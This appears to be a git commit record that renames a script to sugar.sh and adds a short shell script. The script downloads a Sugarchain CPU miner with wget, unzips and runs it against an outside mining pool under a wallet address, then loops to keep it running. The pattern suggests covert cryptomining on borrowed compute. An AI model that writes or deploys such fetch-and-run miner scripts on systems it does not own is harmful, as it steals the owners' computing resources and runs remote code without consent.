c9a3a4b89e1c82f50c62aef42e0606f1a450bd0d
malskas <83383686+malskas@users.noreply.github.com>
2021-04-29 02:31:49 +0000

    Update and rename scala.sh to sugar.sh

---
+++ sugar.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+unzip sugarmaker-v2.5.0-sugar4-linux64.zip ; cd sugarmaker-v2.5.0-sugar4-linux64
+./sugarmaker -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qn3eys9whvyf03vvv3am60zuqsvqzxs8qejv6ve.haha -t2
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
